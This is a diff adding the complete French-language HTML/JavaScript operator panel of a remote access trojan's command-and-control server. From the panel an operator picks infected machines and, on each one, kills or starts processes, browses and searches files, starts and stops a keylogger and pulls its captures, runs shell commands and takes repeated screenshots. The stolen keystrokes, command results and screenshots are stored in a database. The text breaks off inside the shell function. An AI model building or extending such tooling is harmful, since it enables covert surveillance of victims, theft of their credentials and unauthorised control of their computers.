@@ -1,0 +1,1281 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT C2 - Control Panel Complet</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .top-nav {
+            background: white;
+            border-radius: 12px;
+            padding: 15px 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo { font-size: 1.8em; font-weight: 700; color: #667eea; }
+        
+        .main-tabs {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .main-tab {
+            background: #f3f4f6;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .main-tab:hover { background: #e5e7eb; }
+        .main-tab.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .stats-bar {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        
+        .stat-item {
+            text-align: center;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
+            border-radius: 10px;
+        }
+        
+        .stat-value {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: #667eea;
+        }
+        
+        .stat-label {
+            color: #6b7280;
+            font-weight: 600;
+            margin-top: 5px;
+        }
+        
+        .container {
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: 20px;
+            height: calc(100vh - 200px);
+        }
+        
+        .sidebar {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            overflow-y: auto;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        
+        .client-item {
+            padding: 12px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-left: 4px solid #ddd;
+        }
+        
+        .client-item:hover { background: #f9fafb; }
+        .client-item.selected {
+            background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
+            border-left-color: #667eea;
+        }
+        
+        .client-online { border-left-color: #10b981; }
+        .client-offline { border-left-color: #ef4444; }
+        
+        .main-content {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            overflow-y: auto;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        
+        .panel { display: none; }
+        .panel.active { display: block; }
+        
+        .sub-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #e5e7eb;
+            padding-bottom: 10px;
+        }
+        
+        .sub-tab {
+            background: transparent;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #6b7280;
+            transition: all 0.3s ease;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .sub-tab:hover { color: #667eea; }
+        .sub-tab.active {
+            color: #667eea;
+            border-bottom-color: #667eea;
+        }
+        
+        .sub-content { display: none; }
+        .sub-content.active { display: block; }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        
+        th {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        tr:hover { background: #f0f0f0; }
+        
+        .btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-right: 8px;
+            margin-bottom: 8px;
+        }
+        
+        .btn:hover { background: #764ba2; transform: translateY(-2px); }
+        .btn-success { background: #10b981; }
+        .btn-danger { background: #ef4444; }
+        .btn-warning { background: #f59e0b; }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 1em;
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .output-box {
+            background: #1e293b;
+            color: #10b981;
+            padding: 15px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            max-height: 500px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            margin-top: 15px;
+        }
+        
+        .alert {
+            padding: 12px 20px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .alert-success { background: #d1fae5; color: #065f46; }
+        .alert-error { background: #fee2e2; color: #991b1b; }
+        .alert-info { background: #dbeafe; color: #1e40af; }
+        
+        .file-item, .process-item {
+            background: #f8f9fa;
+            padding: 10px;
+            margin-bottom: 5px;
+            border-radius: 5px;
+            border-left: 4px solid #667eea;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .refresh-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            font-size: 1.5em;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            transition: all 0.3s ease;
+        }
+        
+        .refresh-btn:hover { transform: scale(1.1) rotate(180deg); }
+        
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; }
+    </style>
+</head>
+<body>
+    <!-- Top Navigation -->
+    <div class="top-nav">
+        <div class="logo">🎮 RAT C2 - Control Panel Complet</div>
+        <div class="main-tabs">
+            <button class="main-tab active" onclick="showMainPanel('control')">🎯 Contrôle</button>
+            <button class="main-tab" onclick="showMainPanel('database')">💾 Base de Données</button>
+            <button class="main-tab" onclick="showMainPanel('analytics')">📊 Analytiques</button>
+        </div>
+    </div>
+    
+    <!-- Stats Bar -->
+    <div class="stats-bar">
+        <div class="stat-item">
+            <div class="stat-value" id="total-clients">0</div>
+            <div class="stat-label">Total Clients</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="online-clients" style="color: #10b981;">0</div>
+            <div class="stat-label">En Ligne</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="total-keylogs">0</div>
+            <div class="stat-label">Keylogs</div>
+        </div>
+        <div class="stat-item">
+            <div class="stat-value" id="total-commands">0</div>
+            <div class="stat-label">Commandes</div>
+        </div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Sidebar: Client List -->
+        <div class="sidebar">
+            <h3 style="margin-bottom: 15px; color: #667eea;">👥 Clients Connectés</h3>
+            <div id="clients-list"></div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            
+            <!-- PANEL 1: CONTROL -->
+            <div id="control-panel" class="panel active">
+                <h2 style="color: #667eea; margin-bottom: 20px;">🎯 Contrôle du Client</h2>
+                
+                <div id="no-client-selected" style="text-align: center; padding: 50px; color: #6b7280;">
+                    <h3>Aucun client sélectionné</h3>
+                    <p>Sélectionnez un client dans la barre latérale</p>
+                </div>
+                
+                <div id="client-control" style="display: none;">
+                    <div class="sub-tabs">
+                        <button class="sub-tab active" onclick="showSubTab('control', 'info')">ℹ️ Info</button>
+                        <button class="sub-tab" onclick="showSubTab('control', 'processes')">📋 Processus</button>
+                        <button class="sub-tab" onclick="showSubTab('control', 'files')">📁 Fichiers</button>
+                        <button class="sub-tab" onclick="showSubTab('control', 'keylogger')">⌨️ Keylogger</button>
+                        <button class="sub-tab" onclick="showSubTab('control', 'shell')">💻 Shell</button>
+                        <button class="sub-tab" onclick="showSubTab('control', 'screenshot')">📸 Screenshot</button>
+                        <button class="sub-tab" onclick="showSubTab('control', 'system')">🖥️ Système</button>
+                    </div>
+                    
+                    <!-- Info Tab -->
+                    <div id="control-info-tab" class="sub-content active">
+                        <div id="system-info" class="output-box">Chargement...</div>
+                    </div>
+                    
+                    <!-- Processes Tab -->
+                    <div id="control-processes-tab" class="sub-content">
+                        <h3>📋 Gestion des Processus</h3>
+                        
+                        <div style="margin-bottom: 20px;">
+                            <button class="btn" onclick="listProcesses()">📋 Liste Processus</button>
+                            <button class="btn" onclick="getProcessTree()">🌳 Arbre Processus</button>
+                            <button class="btn btn-success" onclick="startProcessPrompt()">🚀 Démarrer Process</button>
+                        </div>
+                        
+                        <div class="grid-2" style="margin-bottom: 20px;">
+                            <div class="card">
+                                <h4>🔍 Détails Process (PID)</h4>
+                                <input type="number" id="process-detail-pid" placeholder="Entrer PID">
+                                <button class="btn" onclick="getProcessDetails()">Voir Détails</button>
+                            </div>
+                            <div class="card">
+                                <h4>💀 Kill Process</h4>
+                                <input type="number" id="kill-pid" placeholder="Entrer PID">
+                                <button class="btn btn-danger" onclick="killProcessByPID()">Tuer Process</button>
+                            </div>
+                        </div>
+                        
+                        <div id="processes-output" class="output-box"></div>
+                    </div>
+                    
+                    <!-- Files Tab -->
+                    <div id="control-files-tab" class="sub-content">
+                        <h3>📁 Gestionnaire de Fichiers</h3>
+                        
+                        <div style="margin-bottom: 20px;">
+                            <label>📂 Chemin:</label>
+                            <input type="text" id="dir-path" placeholder="C:\\" value="C:\\">
+                            <div>
+                                <button class="btn" onclick="listDirectory()">📂 Lister</button>
+                                <button class="btn" onclick="createFolderPrompt()">📁 Nouveau Dossier</button>
+                                <button class="btn" onclick="uploadFilePrompt()">📤 Upload</button>
+                                <button class="btn btn-warning" onclick="searchFilesPrompt()">🔍 Rechercher</button>
+                            </div>
+                        </div>
+                        
+                        <div id="files-output" class="output-box"></div>
+                    </div>
+                    
+                    <!-- Keylogger Tab -->
+                    <div id="control-keylogger-tab" class="sub-content">
+                        <h3>⌨️ Gestion du Keylogger</h3>
+                        
+                        <div style="margin-bottom: 20px;">
+                            <button class="btn btn-success" onclick="startKeylogger()">▶️ Démarrer</button>
+                            <button class="btn btn-danger" onclick="stopKeylogger()">⏹️ Arrêter</button>
+                            <button class="btn" onclick="keyloggerStatus()">📊 Statut</button>
+                            <button class="btn btn-warning" onclick="forceUploadKeylogs()">📤 Force Upload</button>
+                            <button class="btn" onclick="viewKeylogs()">👁️ Voir Keylogs DB</button>
+                        </div>
+                        
+                        <div id="keylogs-output" class="output-box"></div>
+                    </div>
+                    
+                    <!-- Shell Tab -->
+                    <div id="control-shell-tab" class="sub-content">
+                        <h3>💻 Shell Terminal</h3>
+                        
+                        <textarea id="shell-cmd" placeholder="Entrez votre commande..." rows="3"></textarea>
+                        <button class="btn btn-success" onclick="executeShell()">▶️ Exécuter</button>
+                        <button class="btn btn-danger" onclick="clearShellOutput()">🗑️ Effacer</button>
+                        
+                        <div id="shell-output" class="output-box"></div>
+                    </div>
+                    
+                    <!-- Screenshot Tab -->
+                    <div id="control-screenshot-tab" class="sub-content">
+                        <h3>📸 Capture d'Écran</h3>
+                        
+                        <div style="margin-bottom: 20px;">
+                            <button class="btn" onclick="takeScreenshot()">📸 Capture Simple</button>
+                            <button class="btn" onclick="takeMultipleScreenshots()">📸📸 Captures Multiples</button>
+                            <button class="btn" onclick="viewScreenshotsDB()">🖼️ Voir Screenshots DB</button>
+                        </div>
+                        
+                        <div>
+                            <label>📸 Nombre de captures (multi):</label>
+                            <input type="number" id="screenshot-count" value="5" min="1" max="20">
+                            <label>⏱️ Intervalle (secondes):</label>
+                            <input type="number" id="screenshot-interval" value="2" min="1" max="60">
+                        </div>
+                        
+                        <div id="screenshot-output"></div>
+                    </div>
+                    
+                    <!-- System Tab -->
+                    <div id="control-system-tab" class="sub-content">
+                        <h3>🖥️ Informations Système Détaillées</h3>
+                        
+                        <div style="margin-bottom: 20px;">
+                            <button class="btn" onclick="getDetailedSystemInfo('os')">💿 OS Info</button>
+                            <button class="btn" onclick="getDetailedSystemInfo('architecture')">🏗️ Architecture</button>
+                            <button class="btn" onclick="getDetailedSystemInfo('user')">👤 User Info</button>
+                            <button class="btn" onclick="getDetailedSystemInfo('privileges')">🔐 Privilèges</button>
+                            <button class="btn" onclick="getDetailedSystemInfo('network')">🌐 Network Info</button>
+                        </div>
+                        
+                        <div id="system-detailed-output" class="output-box"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- PANEL 2: DATABASE -->
+            <div id="database-panel" class="panel">
+                <h2 style="color: #667eea; margin-bottom: 20px;">💾 Base de Données</h2>
+                
+                <div class="sub-tabs">
+                    <button class="sub-tab active" onclick="showSubTab('database', 'clients')">👥 Clients</button>
+                    <button class="sub-tab" onclick="showSubTab('database', 'keylogs')">⌨️ Keylogs</button>
+                    <button class="sub-tab" onclick="showSubTab('database', 'commands')">📝 Commandes</button>
+                    <button class="sub-tab" onclick="showSubTab('database', 'results')">✅ Résultats</button>
+                    <button class="sub-tab" onclick="showSubTab('database', 'screenshots')">📸 Screenshots</button>
+                </div>
+                
+                <div id="database-clients-tab" class="sub-content active">
+                    <h3>👥 Liste des Clients</h3>
+                    <button class="btn" onclick="loadDBClients()">🔄 Actualiser</button>
+                    <div id="db-clients-output"></div>
+                </div>
+                
+                <div id="database-keylogs-tab" class="sub-content">
+                    <h3>⌨️ Keylogs Enregistrés</h3>
+                    <button class="btn" onclick="loadDBKeylogs()">🔄 Charger</button>
+                    <div id="db-keylogs-output"></div>
+                </div>
+                
+                <div id="database-commands-tab" class="sub-content">
+                    <h3>📝 Historique des Commandes</h3>
+                    <button class="btn" onclick="loadDBCommands()">🔄 Charger</button>
+                    <div id="db-commands-output"></div>
+                </div>
+                
+                <div id="database-results-tab" class="sub-content">
+                    <h3>✅ Résultats des Commandes</h3>
+                    <button class="btn" onclick="loadDBResults()">🔄 Actualiser</button>
+                    <div id="db-results-output"></div>
+                </div>
+                
+                <div id="database-screenshots-tab" class="sub-content">
+                    <h3>📸 Screenshots Enregistrés</h3>
+                    <button class="btn" onclick="loadDBScreenshots()">🔄 Charger</button>
+                    <div id="db-screenshots-output"></div>
+                </div>
+            </div>
+            
+            <!-- PANEL 3: ANALYTICS -->
+            <div id="analytics-panel" class="panel">
+                <h2 style="color: #667eea; margin-bottom: 20px;">📊 Analytiques et Statistiques</h2>
+                
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>📈 Activité des Clients</h3>
+                        <div id="client-activity-stats"></div>
+                    </div>
+                    
+                    <div class="card">
+                        <h3>⌨️ Keylogs par Client</h3>
+                        <div id="keylogs-stats"></div>
+                    </div>
+                    
+                    <div class="card">
+                        <h3>📝 Commandes Exécutées</h3>
+                        <div id="commands-stats"></div>
+                    </div>
+                    
+                    <div class="card">
+                        <h3>🕐 Activité Récente</h3>
+                        <div id="timeline-stats"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <button class="refresh-btn" onclick="refreshAll()" title="Tout Actualiser">🔄</button>
+    
+    <div id="alerts" style="position: fixed; top: 80px; right: 30px; z-index: 1000; max-width: 400px;"></div>
+    
+    <script>
+        const API_BASE = window.location.origin;
+        let selectedClient = null;
+        let refreshInterval = null;
+        
+        window.addEventListener('load', () => {
+            refreshAll();
+            refreshInterval = setInterval(refreshAll, 10000);
+        });
+        
+        function showAlert(message, type = 'info') {
+            const alerts = document.getElementById('alerts');
+            const alert = document.createElement('div');
+            alert.className = `alert alert-${type}`;
+            alert.textContent = message;
+            alerts.appendChild(alert);
+            setTimeout(() => alert.remove(), 5000);
+        }
+        
+        function showMainPanel(panel) {
+            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+            document.querySelectorAll('.main-tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(panel + '-panel').classList.add('active');
+            event.target.classList.add('active');
+            
+            if (panel === 'database') loadDBClients();
+            if (panel === 'analytics') loadAnalytics();
+        }
+        
+        function showSubTab(panel, tab) {
+            document.querySelectorAll(`#${panel}-panel .sub-content`).forEach(t => t.classList.remove('active'));
+            document.querySelectorAll(`#${panel}-panel .sub-tab`).forEach(b => b.classList.remove('active'));
+            document.getElementById(`${panel}-${tab}-tab`).classList.add('active');
+            event.target.classList.add('active');
+        }
+        
+        function selectClient(clientId) {
+            selectedClient = clientId;
+            document.querySelectorAll('.client-item').forEach(c => c.classList.remove('selected'));
+            event.target.closest('.client-item').classList.add('selected');
+            
+            document.getElementById('no-client-selected').style.display = 'none';
+            document.getElementById('client-control').style.display = 'block';
+            
+            loadClientInfo(clientId);
+            showAlert(`Client ${clientId} sélectionné`, 'success');
+        }
+        
+        async function refreshAll() {
+            await loadClients();
+            await loadStats();
+        }
+        
+        async function loadStats() {
+            try {
+                const [statusRes, dbStatsRes] = await Promise.all([
+                    fetch(`${API_BASE}/admin/status`),
+                    fetch(`${API_BASE}/api/database/stats`)
+                ]);
+                
+                const status = await statusRes.json();
+                const dbStats = await dbStatsRes.json();
+                
+                document.getElementById('total-clients').textContent = status.total_clients || 0;
+                document.getElementById('online-clients').textContent = status.online_clients || 0;
+                document.getElementById('total-keylogs').textContent = dbStats.total_keylogs || 0;
+                document.getElementById('total-commands').textContent = dbStats.total_commands || 0;
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+        
+        async function loadClients() {
+            try {
+                const response = await fetch(`${API_BASE}/admin/clients`);
+                const data = await response.json();
+                const clients = data.clients || [];
+                
+                const clientsList = document.getElementById('clients-list');
+                clientsList.innerHTML = '';
+                
+                clients.forEach(client => {
+                    const div = document.createElement('div');
+                    div.className = `client-item ${client.online ? 'client-online' : 'client-offline'}`;
+                    div.onclick = () => selectClient(client.client_id);
+                    
+                    const status = client.online ? '🟢' : '🔴';
+                    const systemInfo = client.system_info || {};
+                    
+                    div.innerHTML = `
+                        <div style="font-weight: 600; margin-bottom: 5px;">${status} ${client.client_id.slice(0, 8)}</div>
+                        <div style="font-size: 0.9em; color: #6b7280;">
+                            ${systemInfo.hostname || 'Unknown'}<br>
+                            ${systemInfo.platform || 'Unknown'}
+                        </div>
+                    `;
+                    
+                    clientsList.appendChild(div);
+                });
+                
+            } catch (error) {
+                showAlert('Erreur chargement clients: ' + error.message, 'error');
+            }
+        }
+        
+        async function loadClientInfo(clientId) {
+            try {
+                const response = await fetch(`${API_BASE}/admin/clients`);
+                const data = await response.json();
+                const client = data.clients.find(c => c.client_id === clientId);
+                
+                if (client) {
+                    const info = client.system_info || {};
+                    document.getElementById('system-info').textContent = 
+                        `🆔 Client ID: ${client.client_id}\n` +
+                        `💻 Hostname: ${info.hostname || 'N/A'}\n` +
+                        `🖥️ Platform: ${info.platform || 'N/A'}\n` +
+                        `👤 Username: ${info.username || 'N/A'}\n` +
+                        `🌐 IP: ${client.ip || 'N/A'}\n` +
+                        `📡 Status: ${client.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
+                        `⏱️ Last Seen: ${new Date(client.last_seen * 1000).toLocaleString()}\n` +
+                        `📊 Check-ins: ${client.checkin_count || 0}`;
+                }
+            } catch (error) {
+                showAlert('Erreur chargement info client', 'error');
+            }
+        }
+        
+        // ==================== PROCESS MANAGEMENT ====================
+        
+        async function listProcesses() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                showAlert('Récupération des processus...', 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'get_all_processes'})
+                });
+                
+                const data = await response.json();
+                const commandId = data.command_id;
+                
+                // Wait for result
+                await waitForResult(commandId, result => {
+                    if (Array.isArray(result)) {
+                        let output = `📋 ${result.length} Processus:\n\n`;
+                        output += `${'PID'.padEnd(8)} ${'Name'.padEnd(25)} ${'CPU%'.padEnd(8)} ${'Mem%'.padEnd(8)} ${'Status'.padEnd(12)}\n`;
+                        output += '─'.repeat(80) + '\n';
+                        
+                        result.slice(0, 50).forEach(proc => {
+                            output += `${String(proc.pid).padEnd(8)} ` +
+                                     `${String(proc.name || 'N/A').slice(0, 24).padEnd(25)} ` +
+                                     `${String(proc.cpu_percent || '0').slice(0, 6).padEnd(8)} ` +
+                                     `${String(proc.memory_percent || '0').slice(0, 6).padEnd(8)} ` +
+                                     `${String(proc.status || 'N/A').slice(0, 11).padEnd(12)}\n`;
+                        });
+                        
+                        if (result.length > 50) output += `\n... et ${result.length - 50} autres processus`;
+                        
+                        document.getElementById('processes-output').textContent = output;
+                        showAlert('Processus chargés', 'success');
+                    } else {
+                        document.getElementById('processes-output').textContent = JSON.stringify(result, null, 2);
+                    }
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function getProcessTree() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                showAlert('Récupération de l\'arbre des processus...', 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'get_process_tree'})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('processes-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Arbre des processus chargé', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function getProcessDetails() {
+            const pid = document.getElementById('process-detail-pid').value;
+            if (!pid || !selectedClient) return showAlert('Entrez un PID et sélectionnez un client', 'error');
+            
+            try {
+                showAlert(`Récupération détails PID ${pid}...`, 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'get_process_details', data: {pid: parseInt(pid)}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('processes-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Détails chargés', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function killProcessByPID() {
+            const pid = document.getElementById('kill-pid').value;
+            if (!pid || !selectedClient) return showAlert('Entrez un PID et sélectionnez un client', 'error');
+            
+            if (!confirm(`Voulez-vous vraiment tuer le processus ${pid}?`)) return;
+            
+            try {
+                showAlert(`Killing PID ${pid}...`, 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'kill_process', data: {pid: parseInt(pid)}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('processes-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Processus tué', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function startProcessPrompt() {
+            const command = prompt('Commande à exécuter:');
+            if (!command || !selectedClient) return;
+            
+            try {
+                showAlert('Démarrage processus...', 'info');
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'start_process', data: {command: command}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('processes-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Processus démarré', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        // ==================== FILE MANAGER ====================
+        
+        async function listDirectory() {
+            const path = document.getElementById('dir-path').value;
+            if (!path || !selectedClient) return showAlert('Entrez un chemin', 'error');
+            
+            try {
+                showAlert('Chargement répertoire...', 'info');
+                const response = await fetch(`${API_BASE}/admin/file/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'list', data: {path: path}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    if (result.files) {
+                        let output = `📂 ${path}\n\n`;
+                        result.files.forEach(file => {
+                            const icon = file.is_dir ? '📁' : '📄';
+                            const size = file.is_dir ? '<DIR>' : formatSize(file.size);
+                            output += `${icon} ${file.name.padEnd(40)} ${size}\n`;
+                        });
+                        document.getElementById('files-output').textContent = output;
+                        showAlert('Répertoire chargé', 'success');
+                    } else {
+                        document.getElementById('files-output').textContent = JSON.stringify(result, null, 2);
+                    }
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function createFolderPrompt() {
+            const folderName = prompt('Nom du dossier:');
+            if (!folderName || !selectedClient) return;
+            
+            const path = document.getElementById('dir-path').value;
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/file/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'create_folder', data: {path: path, folder_name: folderName}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    showAlert('Dossier créé', 'success');
+                    listDirectory();
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function uploadFilePrompt() {
+            showAlert('Upload de fichiers - Utilisez l\'onglet Fichiers pour uploader', 'info');
+        }
+        
+        async function searchFilesPrompt() {
+            const pattern = prompt('Rechercher (pattern):');
+            if (!pattern || !selectedClient) return;
+            
+            const path = document.getElementById('dir-path').value;
+            
+            try {
+                showAlert('Recherche en cours...', 'info');
+                const response = await fetch(`${API_BASE}/admin/file/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'search', data: {path: path, pattern: pattern}})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('files-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Recherche terminée', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        // ==================== KEYLOGGER ====================
+        
+        async function startKeylogger() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'keylogger_start'})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('keylogs-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Keylogger démarré', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function stopKeylogger() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'keylogger_stop'})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('keylogs-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Keylogger arrêté', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function keyloggerStatus() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'keylogger_status'})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('keylogs-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Statut récupéré', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function forceUploadKeylogs() {
+            if (!selectedClient) return showAlert('Sélectionnez un client', 'error');
+            
+            try {
+                const response = await fetch(`${API_BASE}/admin/process/${selectedClient}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({action: 'keylogger_force_upload'})
+                });
+                
+                const data = await response.json();
+                await waitForResult(data.command_id, result => {
+                    document.getElementById('keylogs-output').textContent = JSON.stringify(result, null, 2);
+                    showAlert('Upload forcé', 'success');
+                });
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        async function viewKeylogs() {
+            try {
+                const response = await fetch(`${API_BASE}/api/database/keylogs`);
+                const data = await response.json();
+                
+                if (data.keylogs && data.keylogs.length > 0) {
+                    let output = '⌨️ KEYLOGS:\n\n';
+                    data.keylogs.slice(0, 100).forEach(log => {
+                        output += `[${log.timestamp}] ${log.client_id.slice(0, 8)}: ${log.keystrokes}\n`;
+                    });
+                    document.getElementById('keylogs-output').textContent = output;
+                } else {
+                    document.getElementById('keylogs-output').textContent = 'Aucun keylog trouvé';
+                }
+            } catch (error) {
+                showAlert('Erreur: ' + error.message, 'error');
+            }
+        }
+        
+        // ==================== SHELL ====================
+        
+        async function executeShell() {
+            const cmd = document.getElementById('shell-cmd').value;
